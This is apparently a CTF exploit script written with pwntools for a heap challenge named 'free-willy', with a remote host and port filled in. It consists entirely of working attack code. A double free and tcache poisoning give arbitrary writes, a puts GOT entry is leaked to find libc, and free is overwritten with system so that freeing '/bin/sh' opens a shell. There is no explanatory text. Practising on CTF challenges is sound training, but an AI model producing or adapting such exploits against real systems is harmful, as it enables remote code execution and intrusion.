from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './free-willy'
HOST = 'jh2i.com'
PORT = 50021

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def alloc(name):
    r.sendlineafter('> ', 'adopt')
    r.sendafter('whale?', name)

def delete(idx):
    r.sendlineafter('> ', 'disown')
    r.sendlineafter('away?', str(idx))

def edit(idx, name):
    r.sendlineafter('> ', 'name')
    r.sendlineafter('rename?', str(idx))
    r.sendafter('name?', name)

def show(idx):
    r.sendlineafter('> ', 'observe')
    r.sendlineafter('observe?', str(idx))

alloc('A'*0x1f)
alloc('B'*0x1f)

delete(0)
delete(0)

edit(0, p64(elf.sym.whale_view)+'\n')
alloc(p64(elf.plt.puts)*4)

r.sendline('\n')
'''
for i in range(0x100):
    edit(2, '%%%d$p\n'%(i+1))
    show(2)
'''
edit(0, flat(0, elf.got.puts, 0x100, 0))
r.sendline('\n')
show(2)

r.recvuntil('lil ')
leak = u64(r.recvuntil('\n')[:-1]+'\x00'*2)
base = leak - 0x809c0
dbg('leak')
dbg('base')
system = base + 0x4f440
binsh = base + 0x1b3e9a

edit(0, flat(0, elf.got.free, 0x100, 0)+'\n')
edit(2, flat(system, leak)+'\n')

edit(0, flat(0, binsh, 0x100, 0)+'\n')
if args.D:
    debug(r, [0xe63, 0xba4])
delete(2)
r.interactive()
r.close()
